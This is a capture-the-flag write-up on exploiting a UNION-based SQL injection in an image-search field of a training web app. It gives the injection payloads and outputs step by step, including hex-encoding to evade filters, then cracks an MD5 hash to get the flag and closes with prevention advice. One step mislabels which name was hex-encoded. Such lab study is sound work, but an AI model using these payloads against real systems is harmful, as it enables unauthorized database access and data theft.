## Flag

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## How to find the flag

1. **Identifying SQL Injection Vulnerability**:
    
    If we scroll down in the main page and we go to the search image section, there is a field to search for an image by ID. This field is directly vulnerable to SQL injection. We can use a UNION-based SQL injection to retrieve information about the web-server.
    
2. **Retrieving Database information:**
    
    In order to obtain the database currentyly in use, we can type:
    
    ```sql
    1 union select database(), user()
    ```
    
    Output:
    
    ```
    Member_images
    ```
    
3. **Retrieving Tables in a Database**:
    
    Next, we can list tables within the **Member_images** database using:
    
    ```sql
    1 union select table_name, 2 from information_schema.tables where table_schema=database()
    ```
    
    Output:
    
    ```
    list_images
    ```
    
4. **Finding Columns in the “list_images” table:**
    
    We can view columns within the "list_images" table by using:
    
    ```sql
    1 union select column_name, 2 from information_schema.columns where table_name=0x6c6973745f696d61676573
    ```
    
    Here, we converted "users" to hexadecimal (0x6c6973745f696d61676573) to bypass potential SQL injection filters.
    
5. **Extracting data:**
    
    Now that we know the columns in the "list_images" table, we see a column named "**comment**" To view its content, we use:
    
    ```sql
    1 UNION SELECT comment, 2 FROM list_images
    ```
    
    We obtain:
    
    ```
    If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
    ```
    
6. **Decrypting the Hash:**
    
    Using an MD5 decrypter, we decrypt this hash to reveal: albatroz. By converting it to lowercase and hashing it with SHA-256, we obtain the final flag.

## Prevent SQLi

There are several methods that developers can implement in order to avoid sql injection:

1. **Use prepared statements and parameterized queries:**
    
    Ensure that the user input is not directly inserted into SQL queries.
    
2. **Input validation an sanitization:**
    
    Limit user input to acceptable values, such as numbers, dates, and specific text formats.
    
    Sanitize input to remove or escape potentially dangerous characters(e.g., single quotes or semicolons).
    
3. Implement least privileges for database access:
    
    Configure the database user permissions so that they only have the minimum access necessary.
